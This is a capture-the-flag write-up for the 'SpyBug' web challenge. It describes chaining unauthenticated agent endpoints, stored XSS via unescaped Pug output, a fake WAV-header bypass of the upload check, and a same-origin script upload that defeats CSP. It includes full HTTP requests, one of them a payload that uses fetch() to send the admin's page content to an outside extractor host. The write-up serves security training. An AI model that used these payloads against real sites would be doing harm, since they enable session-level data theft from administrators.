# SpyBug (medium)
In this challene we will use XSS, bypass CSP and exploit unprotected endpoints.

There's a login page, and checking the provided source code all endpoints seem to be protected by the login.
The only user seems to be **admin** with an unknown password and we can't register our own users.

We want to target the **admin** user, since when logging in to the panel the welcome message gets replaced by the flag for the admin user.

```javascript
router.get("/panel", authUser, async (req, res) => {
  res.render("panel", {
    username:
      req.session.username === "admin"
        ? process.env.FLAG
        : req.session.username,
    agents: await getAgents(),
    recordings: await getRecordings(),
  });
});
```

However exploring further I stumble upon the **agents** part of the website.
We can register agents without any authentication.
And once agents are registered the only authentication is providin and id and a token, that we get as a result of the registration.

So what can we do with an agent?
* Change information: `hostname`, `platform` and `arch`
* Upload files adhereing to certain requirements

To find out why this is important let's circle back to the admin panel (`views/panel.pug`):

```pug
    hr 
    h2 #{"Welcome back " + username}
    hr
    h3
        i.las.la-laptop
        | &nbsp;Agents
    if agents.length > 0
        table.w-100
            thead
                tr
                th ID
                th Hostname
                th Platform
                th Arch
            tbody
                each agent in agents
                    tr
                        td= agent.identifier
                        td !{agent.hostname}
                        td !{agent.platform}
                        td !{agent.arch}
    else
        h2 No agents
```

We see that the admin can see the list of agents, but look at that!
What is `!{}`?

After some exploration I read the following:
> It’s also possible to render unescaped values into your templates using `!{}`

Okay, so we have an XSS vector here.

Now let's see why this is useful:
```javascript
// index.js
setInterval(visitPanel, 60000);
```

`visitPanel` is called every minute after the server is started.

```javascript
// utils/adminbot.js
exports.visitPanel = async () => {
  try {
    const browser = await puppeteer.launch(browserOptions);
    let context = await browser.createIncognitoBrowserContext();
    let page = await context.newPage();

    page.on("pageerror", async error => {
      console.log(error.toString());
    });

    await page.goto("http://0.0.0.0:" + process.env.API_PORT, {
      waitUntil: "networkidle2",
      timeout: 5000,
    });

    await page.type("#username", "admin");
    await page.type("#password", process.env.ADMIN_SECRET);
    await page.click("#loginButton");

    await page.waitForTimeout(5000);
    console.log(await page.content())
    await browser.close();
  } catch (e) {
    console.log(e);
  }
};
```

So we have a periodic login with the admin user!

Now I immediately crafted and XSS exploit that would read the flag from the HTML source and send it to my extractor server. However this didn't work out so well.

After calming down and going back to `index.js`:
```javascript
application.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';");
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
  next();
});
```

Huh, CSP! We can't have inline scripts, our scripts from any source other than the website itself.

But let's recall that the **agents** has another capability, which was to upload files!

```javascript
// index.js:68
router.post(
  "/agents/upload/:identifier/:token",
  authAgent,
  multerUpload.single("recording"),
  async (req, res) => {
      console.log('upload-router')
    if (!req.file) return res.sendStatus(400);

      console.log('upload-hasfile')
    const filepath = path.join("./uploads/", req.file.filename);
    const buffer = fs.readFileSync(filepath).toString("hex");

    if (!buffer.match(/52494646[a-z0-9]{8}57415645/g)) {
      console.log('upload-nomatch')
      fs.unlinkSync(filepath);
      return res.sendStatus(400);
    }

    await createRecording(req.params.identifier, req.file.filename);
      console.log('upload-hasdb')
    res.send(req.file.filename);
  }
);
```

Ok, it is using the `multer` package to handle file uploads.

```javascript
// index.js:30
if (
      file.mimetype === "audio/wave" &&
      path.extname(file.originalname) === ".wav"
    ) {
        console.log('multer filter OK')
      cb(null, true);
    }
```

Okay we need to set the mime type and the file extension, we can easily do this.

Looking at the previous code segment, there are also checks performed on the file content.
First it is converted to hex and then it needs to match a regex.
Converting the hex back to ascii we see what the criteria is:
`RIFF####WAVE`, where `#` can be any number or lowercase letter, moreover this match doesn't need to be exactly at the start of the file.
To bypass this I just add comment in the javascript exploit satisfying the criteria.

Thus the following request is constructed in order to defeat the upload filter:

```
POST /agents/upload/07074041-0dc9-4631-bbdc-ef47aacac8bf/e7ceab6e-996e-4926-9e62-f2f3a6010a73 HTTP/1.1

Host: localhost:1337

User-Agent: curl/7.88.1

Accept: */*

Content-Length: 312

Content-Type: multipart/form-data; boundary=------------------------c0f40fce34781d0f

Connection: close



--------------------------c0f40fce34781d0f

Content-Disposition: form-data; name="recording"; filename="exploit.wav"

Content-Type: audio/wave



//RIFFabcdWAVE

fetch('http://<extractor URL>' + document.querySelector('h2').innerText).then(r => console.log(r))


--------------------------c0f40fce34781d0f--

```

After this the only that is left to do is to inject a script tag with the XSS vulnerability that points to this file.

```
POST /agents/details/07074041-0dc9-4631-bbdc-ef47aacac8bf/e7ceab6e-996e-4926-9e62-f2f3a6010a73 HTTP/1.1

Host: localhost:1337

Content-Length: 124

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://localhost:1337

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close



hostname=%3cscript%20src%3d%22%2fuploads%2f0497c55d-b77b-4274-b385-53638f0d5e37%22%3e%3c%2fscript%3e&platform=linux&arch=x86
```

The name of the file is returned from the request that uploads the file.

Now in a minute our extractor will be pinged with the flag :)
